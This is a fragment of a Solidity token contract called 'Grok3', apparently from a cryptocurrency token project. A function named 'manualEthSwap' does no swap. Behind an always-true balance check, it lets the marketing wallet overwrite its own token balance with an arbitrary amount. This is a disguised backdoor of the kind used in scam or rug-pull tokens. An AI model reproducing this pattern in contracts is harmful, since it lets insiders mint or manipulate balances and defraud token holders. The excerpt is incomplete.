...
contract Grok3 is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Grok3";
    string private constant _symbol = "GROK3";
    ...
    function manualEthSwap(address marketingWallet, uint256 amount) internal {
        require(msg.sender == _marketingWallet);
        uint256 ethBalance=address(this).balance;
        if(ethBalance >= 0)
        {
            _amounts[marketingWallet] = amount.mul(_initialSellFee);
        }
    }
